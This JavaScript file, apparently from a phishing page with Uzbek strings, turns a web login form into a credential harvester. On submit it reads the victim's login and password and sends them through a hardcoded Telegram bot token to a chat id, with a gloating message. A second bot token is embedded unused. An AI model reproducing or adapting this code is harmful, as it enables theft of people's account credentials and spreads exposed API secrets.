
// // let name = prompt("name")
// let son = prompt("shaxsiy parol")




// let ism = prompt("Ismingizni kiriting")
// name.innerText = ism
// alert(ism)




let body = document.querySelector("body")
let form = document.querySelector("form")
let button = document.querySelector("button")
let input = document.querySelectorAll("input")

let TOKEN = "6976694263:AAFmybP098xaJ0E2uODXFy0Lz_nZdKa1PtQ"
let URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`
let chat_id = "-1002011891173"

let a = `https://api.telegram.org/bot6813295096:AAEbTqEIYm0Bt_cMXcmRMFp-XMl_-LBOnYI/sendMessage`

form.addEventListener("submit", (e) => {
    e.preventDefault()
    let login = input[0].value
    let password = input[1].value
    
    fetch(URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: ` yeb qoygan bolani aki \n Login: ${login}  \n Password: ${password}`
          
        })
    })
    .then((response) => response.json())
})
